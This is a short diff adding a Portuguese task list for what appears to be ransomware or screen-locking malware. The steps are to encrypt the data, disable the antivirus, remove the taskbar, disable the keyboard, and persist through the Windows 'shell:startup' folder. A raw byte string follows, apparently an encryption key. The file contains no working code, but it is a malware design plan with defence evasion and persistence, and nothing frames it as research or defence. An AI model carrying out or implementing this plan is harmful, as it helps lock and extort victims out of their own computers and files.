@@ -1,0 +1,7 @@
+1. Criptografar os dados
+2. Desativar o Anti-Virus
+3. Remover a barra de tarefas
+4. Desativar o teclado
+5. Abrir a tela principal (abrir depois que o computador for reiniciado. Precisa colocar nesse caminho: "shell:startup")
+
+b'\tL\xc2\xfdI\x08\xe6\xd4\xedd\xdcWe\xcfJ\xf1\xae\x15J\x81\xe6\x1fq\xab?\xf8\xf8\xd0\xa7\x8e"s'
